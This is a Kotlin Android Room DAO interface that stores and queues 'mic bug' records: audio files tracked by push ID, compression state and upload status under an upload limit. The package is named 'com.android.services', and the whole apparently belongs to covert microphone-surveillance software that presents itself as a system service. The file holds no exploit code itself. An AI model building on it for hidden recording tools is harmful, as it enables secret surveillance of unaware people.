package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.MicBug
import com.android.services.util.AppConstants

@Dao
interface MicBugDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(micBug: MicBug)

    @Query("Select * from mic_bug_table where mic_bug_status =:status and is_compressed=:is_compressed order by date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllMicBugs(status: Int, is_compressed: Int): List<MicBug>

    @Query("Select * from mic_bug_table where pushId =:push_id order by date DESC")
    fun selectMicBugWithSamePushId(push_id: String): List<MicBug>

    @Query("Select * from mic_bug_table where is_compressed =:isCompressed order by date DESC")
    fun selectUnCompressedMicBugs(isCompressed: Int=0): List<MicBug>

    @Query("Update mic_bug_table set mic_bug_status=:updated_status where file=:file")
    fun update(file: String, updated_status: Int): Int

    @Query("Update mic_bug_table set is_compressed=:is_compressed where file=:file")
    fun updateCompressionStatus(file: String, is_compressed: Int): Int
}